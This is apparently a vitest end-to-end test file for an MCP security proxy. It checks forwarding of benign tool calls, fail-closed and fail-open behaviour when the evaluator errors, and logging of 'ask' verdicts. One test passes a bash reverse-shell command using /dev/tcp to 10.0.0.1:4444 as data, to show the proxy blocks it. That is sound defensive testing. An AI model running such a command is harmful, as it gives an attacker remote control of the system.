/**
 * Proxy transport E2E — agent <-> proxy <-> upstream over in-memory transports.
 *
 * Complements proxy-e2e.test.ts (which tests the ProxyEvaluator / L2 brain with
 * real rules). This one drives the FULL flow through real MCP machinery to
 * prove the L1 inline gate + forwarding works: a benign call reaches upstream
 * and returns its result; a block-on-sight payload is blocked at the gate and
 * never reaches upstream. Uses an always-allow evaluator so the assertions are
 * about the gate + transport, not the ATR corpus.
 */
import { describe, it, expect } from 'vitest';
import { Server } from '@modelcontextprotocol/sdk/server/index.js';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js';
import { CallToolRequestSchema, ListToolsRequestSchema } from '@modelcontextprotocol/sdk/types.js';
import { MCPProxy } from '../src/proxy.js';
import type { ProxyEvaluatorLike } from '../src/proxy.js';

const allowAll: ProxyEvaluatorLike = {
  loadRules: async () => 0,
  evaluateToolCall: async () => ({
    outcome: 'allow',
    reason: '',
    matchedRules: [],
    confidence: 0,
    durationMs: 0,
  }),
  evaluateToolResponse: async () => ({
    outcome: 'allow',
    reason: '',
    matchedRules: [],
    confidence: 0,
    durationMs: 0,
  }),
};

/** A minimal upstream MCP server exposing echo + run tools. */
function makeUpstream(): Server {
  const server = new Server(
    { name: 'test-upstream', version: '0.0.1' },
    { capabilities: { tools: {} } }
  );
  server.setRequestHandler(ListToolsRequestSchema, async () => ({
    tools: [
      { name: 'echo', description: 'echo text', inputSchema: { type: 'object' as const } },
      { name: 'run', description: 'run a command', inputSchema: { type: 'object' as const } },
    ],
  }));
  server.setRequestHandler(CallToolRequestSchema, async (req) => {
    const args = (req.params.arguments ?? {}) as Record<string, unknown>;
    if (req.params.name === 'echo') {
      return { content: [{ type: 'text' as const, text: String(args['text'] ?? '') }] };
    }
    return { content: [{ type: 'text' as const, text: 'ran' }] };
  });
  return server;
}

/** Wire upstream <-> proxy <-> agent over in-memory transports. */
async function wireStack(): Promise<Client> {
  const upstream = makeUpstream();
  const [upSrv, proxyCli] = InMemoryTransport.createLinkedPair();
  await upstream.connect(upSrv);

  const proxy = new MCPProxy(
    { upstreamCommand: 'noop', upstreamArgs: [] },
    { evaluator: allowAll }
  );
  const [proxySrv, agentCli] = InMemoryTransport.createLinkedPair();
  await proxy.connect(proxyCli, proxySrv);

  const agent = new Client({ name: 'test-agent', version: '0.0.1' }, { capabilities: {} });
  await agent.connect(agentCli);
  return agent;
}

function textOf(result: unknown): string {
  const content = (result as { content?: Array<{ text?: string }> }).content;
  return content?.map((c) => c.text ?? '').join('\n') ?? '';
}

/** An evaluator that always throws — simulates a crashed/timed-out async brain. */
const throwingEvaluator: ProxyEvaluatorLike = {
  loadRules: async () => 0,
  evaluateToolCall: async () => {
    throw new Error('evaluator unavailable');
  },
  evaluateToolResponse: async () => {
    throw new Error('evaluator unavailable');
  },
};

/** An evaluator that always returns 'ask' on the pre-call — flagged, not denied. */
const askOnCall: ProxyEvaluatorLike = {
  loadRules: async () => 0,
  evaluateToolCall: async () => ({
    outcome: 'ask',
    reason: 'low-confidence match',
    matchedRules: ['ATR-2026-00001'],
    confidence: 40,
    durationMs: 0,
  }),
  evaluateToolResponse: async () => ({
    outcome: 'allow',
    reason: '',
    matchedRules: [],
    confidence: 0,
    durationMs: 0,
  }),
};

/** Wire the stack with a chosen evaluator (for fail-mode tests). */
async function wireWith(evaluator: ProxyEvaluatorLike): Promise<Client> {
  const upstream = makeUpstream();
  const [upSrv, proxyCli] = InMemoryTransport.createLinkedPair();
  await upstream.connect(upSrv);
  const proxy = new MCPProxy({ upstreamCommand: 'noop', upstreamArgs: [] }, { evaluator });
  const [proxySrv, agentCli] = InMemoryTransport.createLinkedPair();
  await proxy.connect(proxyCli, proxySrv);
  const agent = new Client({ name: 'test-agent', version: '0.0.1' }, { capabilities: {} });
  await agent.connect(agentCli);
  return agent;
}

describe('MCPProxy fail-mode (security-first default)', () => {
  it('fails CLOSED by default — a benign call is DENIED when the evaluator errors', async () => {
    delete process.env['PANGUARD_PROXY_FAIL_MODE'];
    const agent = await wireWith(throwingEvaluator);
    const r = await agent.callTool({ name: 'echo', arguments: { text: 'hello world' } });
    // Evaluator threw → fail-closed → the call is blocked, never forwarded.
    expect(textOf(r)).toContain('BLOCKED');
  });

  it('honors PANGUARD_PROXY_FAIL_MODE=open — forwards when the evaluator errors', async () => {
    process.env['PANGUARD_PROXY_FAIL_MODE'] = 'open';
    try {
      const agent = await wireWith(throwingEvaluator);
      const r = await agent.callTool({ name: 'echo', arguments: { text: 'hello world' } });
      expect(textOf(r)).toBe('hello world');
    } finally {
      delete process.env['PANGUARD_PROXY_FAIL_MODE'];
    }
  });
});

describe("MCPProxy 'ask' verdict (logged-and-forwarded, never silent)", () => {
  it("writes a loud FLAGGED (ask) line and still forwards the call", async () => {
    const lines: string[] = [];
    const orig = process.stderr.write.bind(process.stderr);
    // Capture stderr for the duration of this call.
    process.stderr.write = ((chunk: string | Uint8Array): boolean => {
      lines.push(typeof chunk === 'string' ? chunk : Buffer.from(chunk).toString());
      return true;
    }) as typeof process.stderr.write;
    try {
      const agent = await wireWith(askOnCall);
      const r = await agent.callTool({ name: 'echo', arguments: { text: 'hello world' } });
      // 'ask' is logged-and-forwarded: the upstream result comes back unchanged...
      expect(textOf(r)).toBe('hello world');
      // ...but it must NOT be silent — the FLAGGED (ask) line names the tool.
      const flagged = lines.join('');
      expect(flagged).toContain('FLAGGED (ask)');
      expect(flagged).toContain('echo');
    } finally {
      process.stderr.write = orig;
    }
  });
});

describe('MCPProxy transport e2e (full forward/block flow)', () => {
  it('forwards a benign tool call to upstream and returns its result', async () => {
    const agent = await wireStack();
    const r = await agent.callTool({ name: 'echo', arguments: { text: 'hello world' } });
    expect(textOf(r)).toBe('hello world');
  });

  it('blocks a reverse-shell payload at the gate, never reaching upstream', async () => {
    const agent = await wireStack();
    const r = await agent.callTool({
      name: 'run',
      arguments: { cmd: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' },
    });
    expect(textOf(r)).toContain('BLOCKED');
  });

  it('lists upstream tools through the proxy', async () => {
    const agent = await wireStack();
    const tools = await agent.listTools();
    expect(tools.tools.map((t) => t.name).sort()).toEqual(['echo', 'run']);
  });
});
